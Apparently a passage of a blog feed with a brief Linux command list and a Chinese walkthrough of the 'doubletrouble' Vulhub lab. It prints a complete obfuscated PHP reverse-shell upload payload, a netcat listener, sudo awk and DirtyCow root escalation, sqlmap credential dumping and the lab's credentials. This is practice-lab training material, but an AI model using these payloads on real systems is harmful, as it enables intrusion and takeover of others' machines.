-<h2 id="Linux命令补充："><a href="#Linux命令补充：" class="headerlink" title="##Linux命令补充："></a>##Linux命令补充：</h2><pre><code>关机指令： 
-poweroff //立刻关机
-halt //立刻关机
-init命令：  
---run level 0: 关机
---run level 3: 纯文本模式
---run level 6: 重新启动
-reboot //立即重启
-Shutdown [选项] 时间
-选项： 
--c: 取消前一个关机命令
--h: 关机
--r：重启
-用户登录命令; 
-login //登录
-基本语法：login [name][-p][-h主机名称]
-用户退出命令： 
-exit //退出控制台
-logout //注销用户
-apt-get:  
-sudo apt-get update 更新软件列表
-sudo apt-get upgrade 更新软件
-sudo apt-get install banner 安装一个文字图形输出
-</code></pre>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Vulhub靶场实验1</title>
-    <url>/2021/06/19/vulhub-doubletrouble/</url>
-    <content><![CDATA[<h2 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h2><p>VULHUB靶场实验</p>
-<h2 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h2><p>fscan：端口扫描工具</p>
-<p>nmap：十分好用的端口扫描工具</p>
-<p>攻击机：<font color="red"><code>Kali Linux</code></font></p>
-<p>IP：<font color="red"><code>192.168.12.24</code></font></p>
-<p>目标机：<font color="red"><code>Debian</code></font></p>
-<p>IP：<font color="red"><code>192.168.12.158</code></font></p>
-<h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><h4 id="步骤1：获取目标IP地址"><a href="#步骤1：获取目标IP地址" class="headerlink" title="步骤1：获取目标IP地址"></a>步骤1：获取目标IP地址</h4><p>​    方法一：使用fscan 扫描一下ip段，获取目标ip为192.168.12.178</p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022162158827.png" alt="image-20211022162158827"></p>
-<p>​    方法二：使用Advanced IP Scanner 扫描指定IP段内的机器</p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022162138694.png" alt="image-20211022162138694"></p>
-<p>​    </p>
-<h4 id="步骤2：使用Nmap扫描目标开放端口"><a href="#步骤2：使用Nmap扫描目标开放端口" class="headerlink" title="步骤2：使用Nmap扫描目标开放端口"></a>步骤2：使用Nmap扫描目标开放端口</h4><p>​    使用nmap扫描192.168.12.158，发现开放了22、80端口</p>
-<p>​    <code>nmap -A -p- 192.168.12.158 -oN /root/桌面/doubletrouble.txt</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022163553259.png" alt="image-20211022163553259"></p>
-<h4 id="步骤3：访问目标网站"><a href="#步骤3：访问目标网站" class="headerlink" title="步骤3：访问目标网站"></a>步骤3：访问目标网站</h4><p>​    浏览器访问192.168.12.158，发现一个Login页面</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022162732808.png" alt="image-20211022162732808"></p>
-<p>​    尝试了弱口令没有效果，这个页面没有办法处理，使用dirsearch扫描目录</p>
-<blockquote>
-<p>用法：dirsearch -u [域名/IP地址] -o [导出文件路径]</p>
-</blockquote>
-<p>​    <code>dirsearch -u 192.168.12.158 -o /root/桌面/dir.txt </code></p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191439315.png" alt="image-20211022191439315"></p>
-<p>​    使用cat命令筛选出200响应码的路径</p>
-<p>​    <code>cat dir.txt | grep 200</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022191555234.png" alt="image-20211022191555234"></p>
-<h4 id="步骤4：利用stegseek图片解密"><a href="#步骤4：利用stegseek图片解密" class="headerlink" title="步骤4：利用stegseek图片解密"></a>步骤4：利用stegseek图片解密</h4><p>​    在/secret/目录中有个比较奇怪的图片，将它保存到本地<img src="/2021/06/19/vulhub-doubletrouble/image-20211022191657862.png" alt="image-20211022191657862"></p>
-<p>​    使用stegseek对图片进行解密</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github：https://github.com/RickdeJager/stegseek/releases</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>​    kali自带了rockyou.txt，但是需要解压一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">sudo stegseek ./doubletrouble.jpg /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191902565.png" alt="image-20211022191902565"></p>
-<p>​    使用cat查看解密出的文件，得出账号密码</p>
-<pre><code>otisrush@localhost.como
-tis666   `
-</code></pre>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191951620.png" alt="image-20211022191951620"></p>
-<p>​    进入之前的登录窗口尝试登录一下，登录成功<img src="/2021/06/19/vulhub-doubletrouble/image-20211022192102168.png" alt="image-20211022192102168"></p>
-<p>​    之前在翻目录的时候看到install写着qdPM 9.1</p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022192315499.png" alt="image-20211022192315499"></p>
-<h2 id="qdPM漏洞利用"><a href="#qdPM漏洞利用" class="headerlink" title="qdPM漏洞利用"></a>qdPM漏洞利用</h2><h4 id="步骤6：php反弹shell"><a href="#步骤6：php反弹shell" class="headerlink" title="步骤6：php反弹shell"></a>步骤6：php反弹shell</h4><p>​    发现就是用户的myAccount界面的图片那一栏是可以上传文件的，我们上传一个php反弹shell的脚本</p>
-<p>​    <strong>PHP反弹shell脚本：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function which($pr) &#123;</span><br><span class="line">$path = execute(&quot;which $pr&quot;);</span><br><span class="line">return ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line">function execute($cfe) &#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">if ($cfe) &#123;</span><br><span class="line">if(function_exists(&#x27;exec&#x27;)) &#123;</span><br><span class="line">@exec($cfe,$res);</span><br><span class="line">$res = join(&quot;\n&quot;,$res);</span><br><span class="line">&#125; elseif(function_exists(&#x27;shell_exec&#x27;)) &#123;</span><br><span class="line">$res = @shell_exec($cfe);</span><br><span class="line">&#125; elseif(function_exists(&#x27;system&#x27;)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@system($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; elseif(function_exists(&#x27;passthru&#x27;)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@passthru($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) &#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">while(!@feof($f)) &#123;</span><br><span class="line">$res .= @fread($f,1024);</span><br><span class="line">&#125;</span><br><span class="line">@pclose($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $res;</span><br><span class="line">&#125;</span><br><span class="line">function cf($fname,$text)&#123;</span><br><span class="line">if($fp=@fopen($fname,&#x27;w&#x27;)) &#123;</span><br><span class="line">@fputs($fp,@base64_decode($text));</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = &quot;your IP&quot;;</span><br><span class="line">$yourport = &#x27;your port&#x27;;</span><br><span class="line">$usedb = array(&#x27;perl&#x27;=&gt;&#x27;perl&#x27;,&#x27;c&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.</span><br><span class="line">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.</span><br><span class="line">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.</span><br><span class="line">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.</span><br><span class="line">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.</span><br><span class="line">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.</span><br><span class="line">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;</span><br><span class="line">cf(&#x27;/tmp/.bc&#x27;,$back_connect);</span><br><span class="line">$res = execute(which(&#x27;perl&#x27;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上传shell脚本地址：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.xxx.xxx/index.php/myAccount</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022193246249.png" alt="image-20211022193246249"></p>
-<p>​    上传成功后，在kali中开启监听</p>
-<p>​    <code>nc -lnvp 4444</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193338295.png" alt="image-20211022193338295"></p>
-<p>​    打开uploads/users中有我们上传到的php脚本，点击php开始执行，shell反弹成功</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193545670.png" alt="image-20211022193545670"></p>
-<p>​    使用python改成伪交互式的shell</p>
-<p>​    <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193920424.png" alt="image-20211022193920424"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​    </p>
-<p>​    查看当前用户能使用sudo的权限 ，可免密执行awk命令</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022194739519.png" alt="image-20211022194739519"></p>
-<p>​    awk命令可以进行提权</p>
-<p>​    <code>sudo awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022201042933.png" alt="image-20211022201042933"></p>
-<p>​    进入root目录，ls查看一下，下载doubletrouble.ova</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022201850780.png" alt="image-20211022201850780"></p>
-<p>​    首先查看一下是否有python3环境</p>
-<p>​    <code>python3 -V</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022202714437.png" alt="image-20211022202714437"></p>
-<p>​    使用python3开启一个http服务，然后从本地下载doubeltrouble.ova导入</p>
-<p>​    <code>python3 -m http.server 8888</code></p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022202648058.png" alt="image-20211022202648058"></p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022202817305.png" alt="image-20211022202817305"></p>
-<p>​    导入后扫描一下ip</p>
-<blockquote>
-<p>目标IP地址：192.168.12.58</p>
-</blockquote>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022205106315.png" alt="image-20211022205106315"></p>
-<p>​    使用nmap扫描一下开放端口</p>
-<p>​    <code>nmap -A -p- 192.168.12.58</code></p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022210136685.png" alt="image-20211022210136685"></p>
-<p>​    开放端口22、80</p>
-<p>​    访问80端口，发现是一个登录界面</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022210925530.png" alt="image-20211022210925530"></p>
-<p>​    尝试使用万能密码，测试是否存在注入</p>
-<p>​    使用burp抓包，导出为txt文件，使用sqlmap测试</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022211235472.png" alt="image-20211022211235472"></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022211347686.png" alt="image-20211022211347686"></p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022211538042.png" alt="image-20211022211538042"></p>
-<pre><code> sqlmap跑出 uname存在时间延时盲注
-</code></pre>
-<p>​    使用sqlmap跑用户名</p>
-<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C username --dump --batch --threads 10</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022212640708.png" alt="image-20211022212640708"></p>
-<p>​    sqlmap跑密码</p>
-<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C password --dump --batch --threads 10</code></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022213344601.png" alt="image-20211022213344601"></p>
-<p>​    尝试在网站上登录，两个都不好使，尝试使用ssh登录</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022214311920.png" alt="image-20211022214311920"></p>
-<p>​    登陆成功，查看系统版本内核</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">uname -a</span><br><span class="line">得到版本是3.2.0-4</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022214436791.png" alt="image-20211022214436791"></p>
-<p>​    使用<code>cat /etc/*-release</code>看到是Debian 7系统</p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022214642153.png" alt="image-20211022214642153"></p>
-<p>​    Debian 7系统可以通过脏牛提权</p>
-<blockquote>
-<p>github:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022214856123.png" alt="image-20211022214856123"></p>
-</blockquote>
-<p>​    在靶机上<code>gcc -v</code> 查看是否有gcc编译环境</p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215047970.png" alt="image-20211022215047970"></p>
-<p>​    传到目标靶机上，然后进行编译</p>
-<p><code>scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58:/tmp </code><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215157188.png" alt="image-20211022215157188"></p>
-<p>​    <code>gcc -pthread dirty.c -o dirty -lcrypt</code> </p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215311781.png" alt="image-20211022215311781"></p>
-<p>​    然后去执行dirty</p>
-<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022215345404.png" alt="image-20211022215345404"></p>
-<p>​    <code>su firefart</code></p>
-<p>​    登录到firefart上</p>
-<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215539698.png" alt="image-20211022215539698">    </p>
-<p>​    成功获取到root权限以及flag</p>
-<blockquote>
-<p>flag:1B8EEA89EA92CECB931E3CC25AA8DE21</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
       </tags>
   </entry>
 </search>
